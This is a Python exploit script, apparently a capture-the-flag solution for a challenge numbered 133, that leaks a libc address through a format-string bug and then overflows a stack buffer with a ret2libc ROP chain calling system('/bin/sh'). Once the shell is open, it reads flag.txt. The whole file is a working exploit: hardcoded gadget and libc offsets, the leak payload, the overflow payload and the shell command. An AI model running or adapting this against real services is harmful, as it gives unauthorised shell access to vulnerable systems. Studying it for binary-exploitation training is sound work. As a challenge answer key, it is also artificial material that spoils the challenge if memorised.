#!/usr/bin/env python3
"""Single-connection exploit for 133: fmt leak (pos11=_IO_list_all) + ret2libc."""
import re
import socket
import struct
import sys
import time

POP_RDI = 0x400793
RET = 0x4005D1
OFFSET = 120
LIST_ALL_OFF = 0x3EC660
SYSTEM_OFF = 0x4F440
BINSH_OFF = 0x1B3D88


def recv_all(s, timeout=8, maxlen=131072):
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            out += c
            if len(out) > maxlen:
                break
    except socket.timeout:
        pass
    return out


def solve(host, port, timeout=15):
    s = socket.create_connection((host, int(port)), timeout=timeout)
    try:
        banner = recv_all(s, timeout=5)
        fmt = ("START." + "%p." * 40).encode()
        s.sendall(fmt + b"\n")
        echo = recv_all(s, timeout=5)
        print(f"[*] echo: {echo[:400]!r}")
        vals = re.findall(rb"0x[0-9a-fA-F]+|\(nil\)", echo)
        # pos11 (1-based index 10) - count from START marker: vals[0] is first %p
        if len(vals) < 12:
            print("[-] too few values");
            return None
        list_all = int(vals[10][2:], 16)
        base = list_all - LIST_ALL_OFF
        print(f"[*] _IO_list_all={hex(list_all)} base={hex(base)}")
        system = base + SYSTEM_OFF
        binsh = base + BINSH_OFF
        rop = b"A" * OFFSET + struct.pack("<Q", POP_RDI) \
            + struct.pack("<Q", binsh) + struct.pack("<Q", RET) \
            + struct.pack("<Q", system)
        s.sendall(rop + b"\n")
        time.sleep(1)
        s.sendall(b"cat flag.txt\n")
        out = recv_all(s, timeout=timeout)
        print(out.decode(errors="replace")[:2000])
        m = re.search(rb"(academy\{[^}]*\}|picoCTF\{[^}]*\})", out)
        if m:
            return m.group(0).decode()
        return out.decode(errors="replace")
    finally:
        s.close()


if __name__ == "__main__":
    print(solve(sys.argv[1], int(sys.argv[2])))
